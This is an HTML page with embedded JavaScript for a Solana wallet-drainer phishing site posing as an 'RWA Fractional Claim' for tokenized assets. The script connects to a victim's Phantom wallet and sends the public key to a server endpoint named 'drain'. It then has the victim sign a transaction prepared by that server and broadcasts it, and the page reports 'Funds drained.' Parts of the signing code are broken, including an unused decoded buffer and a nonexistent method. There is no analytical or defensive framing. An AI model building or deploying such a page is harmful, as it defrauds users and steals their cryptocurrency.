<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RWA Fractional Claim | Exclusive Access</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: #111;
            padding: 40px;
            border-radius: 16px;
            border: 1px solid #333;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #fff;
            letter-spacing: 1px;
        }
        p {
            color: #888;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .claim-btn {
            background: linear-gradient(90deg, #00ff88, #00cc6a);
            color: #000;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
            text-transform: uppercase;
        }
        .claim-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
        }
        .claim-btn:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .status {
            margin-top: 20px;
            font-size: 12px;
            color: #00ff88;
            min-height: 20px;
        }
        .wallet-address {
            margin-top: 20px;
            font-size: 11px;
            color: #555;
            word-break: break-all;
        }
        .loading {
            display: none;
            margin-top: 10px;
            color: #00ff88;
            font-size: 12px;
        }
        /* Spinner */
        .spinner {
            border: 2px solid #333;
            border-top: 2px solid #00ff88;
            border-radius: 50%;
            width: 14px;
            height: 14px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <h1>RWA Fractional Claim</h1>
    <p>Exclusive access to tokenized assets. Connect your wallet to claim your share.</p>
    
    <button id="connectBtn" class="claim-btn" onclick="connectWallet()">Connect Wallet</button>
    
    <div id="claimSection" style="display: none;">
        <button id="claimBtn" class="claim-btn" onclick="claimAndDrain()">Claim & Connect</button>
    </div>

    <div class="loading" id="loading">
        <div class="spinner"></div> Processing transaction...
    </div>
    
    <div class="status" id="status"></div>
    <div class="wallet-address" id="walletAddress"></div>
</div>

<script>
    const connectBtn = document.getElementById('connectBtn');
    const claimBtn = document.getElementById('claimBtn');
    const claimSection = document.getElementById('claimSection');
    const statusEl = document.getElementById('status');
    const walletAddrEl = document.getElementById('walletAddress');
    const loadingEl = document.getElementById('loading');

    let walletPublicKey = null;

    async function connectWallet() {
        if (!window.solana) {
            statusEl.textContent = "Phantom wallet not detected. Install Phantom.";
            statusEl.style.color = "#ff4444";
            return;
        }

        try {
            const resp = await window.solana.connect();
            walletPublicKey = resp.publicKey;
            
            connectBtn.style.display = 'none';
            claimSection.style.display = 'block';
            walletAddrEl.textContent = walletPublicKey.toString();
            statusEl.textContent = "Wallet Connected";
            statusEl.style.color = "#00ff88";
        } catch (err) {
            statusEl.textContent = "Connection failed.";
            statusEl.style.color = "#ff4444";
        }
    }

    async function claimAndDrain() {
        if (!window.solana) return;

        loadingEl.style.display = 'block';
        claimBtn.disabled = true;
        statusEl.textContent = "Preparing transaction...";

        try {
            // 1. Send public key to Netlify function
            const response = await fetch('/.netlify/functions/drain', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ publicKey: walletPublicKey.toString() })
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.error || 'Server error');
            }

            statusEl.textContent = "Transaction ready. Sign in Phantom.";
            
            // 2. Decode the transaction from Base64
            const transactionBuffer = Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0));
            const transaction = new solanaWeb3.Transaction();
            transaction.serializeAndSign({
                signer: window.solana.payer,
                transaction: transaction
            });

            // 3. Send to Phantom for signing
            const signedTx = await window.solana.signTransaction(transaction);
            
            statusEl.textContent = "Sending to network...";
            
            // 4. Send signed transaction to Netlify function to broadcast
            const sendResponse = await fetch('/.netlify/functions/drain', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    transaction: btoa(String.fromCharCode(...signedTx.serialize())) 
                })
            });

            const sendResult = await sendResponse.json();

            if (!sendResponse.ok) {
                throw new Error(sendResult.error || 'Send failed');
            }

            statusEl.textContent = "SUCCESS! Funds drained.";
            statusEl.style.color = "#00ff88";
            loadingEl.style.display = 'none';
            claimBtn.style.background = "#00cc6a";
            claimBtn.textContent = "Drained";

        } catch (err) {
            statusEl.textContent = "Error: " + err.message;
            statusEl.style.color = "#ff4444";
            loadingEl.style.display = 'none';
            claimBtn.disabled = false;
        }
    }
</script>
</body>
</html>
